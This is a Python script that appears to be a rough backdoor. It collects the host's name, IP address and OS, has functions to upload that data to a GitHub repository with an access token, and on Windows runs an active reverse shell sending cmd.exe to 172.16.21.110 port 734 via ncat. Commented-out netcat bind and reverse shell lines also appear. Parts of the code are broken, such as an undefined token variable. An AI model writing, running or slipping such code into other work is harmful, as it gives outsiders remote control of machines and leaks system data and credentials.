import platform
import os
import sysconfig
import socket
import json
import base64
import requests

def create_file(file_path, content):
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(content)

def delete_file(file_path):
    os.remove(file_path)



def update_file_on_github(file_path,token):
    url = f"https://api.github.com/repos/kaki714/Not/contents/data/data.txt"
    headers = {
        'Accept': 'application/vnd.github.v3+json',
        'Authorization': f'token {token}'
    }

    with open(file_path, "r", encoding="utf-8") as file:
        content = file.read().encode("utf-8")
        data = {
            "message": "Actualizar contenido del archivo",
            "content": content
        }
        response = requests.put(url, headers=headers, json=data)

    print(response.status_code)


def subir_archivo( nombre_archivo, contenido_archivo):
    url = f"https://api.github.com/repos/kaki714/Not/contents/{nombre_archivo}"
   
    headers = {
        "Authorization": f"{token}",
        "Content-Type": "application/json"
    }
    contenido_base64 = base64.b64encode(contenido_archivo.encode()).decode()
    data = {
        "message": "Agregar archivo",
        "content": contenido_base64
    }
    response = requests.post(url, json=data, headers=headers)
    if response.status_code == 201:
        print("Archivo subido exitosamente")
    else:
        print(f"Error al subir el archivo: {response.json()['message']}")

def fillFile(file_path, string_to_write):
    with open(file_path, "w") as file:
        file.write(string_to_write)
        

def run(token):
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname) 
    iph='172.16.21.110'
    fname="data.txt"
    print('')
    print(' ############### # # # ##############')
    print(' ####### ###### # #  # # ####### ####')
    print(' ######   ##### ##    ## ######   ###')
    print(' ####### #######  #  #  ######## ####')
    print(' ################ ### ###############')
    print('')
    print('# OS name: ', platform.system())
    if "Linux" in platform.system():
        print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
        print(' IpAddress: ', IPAddr)
        print('insert Filename to upload: ')
        archive=input()
        #upload_file_to_github(archive)
        #os.system( 'nc -lvp 734 -e /bin/sh')
        #os.system('nc' + iph+ ' 734 -e /bin/sh')
    elif "Windows" in platform.system():
        print('Windows: ', sysconfig.get_platform(),' === CONNECTED ') 
        print('Address ip: ', IPAddr)
        print('TokenData: ', token)
        stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
        print("text stmnt: "+ stmnt)
        create_file(fname,stmnt)
        #subir_archivo('data.txt', stmnt )
        #update_file_on_github(fname,token)
        #delete_file("data.txt")
        
        #os.system('ncat -lvp 734 -e cmd.exe')
        os.system('ncat '+ iph +' 734 -e cmd.exe')
    
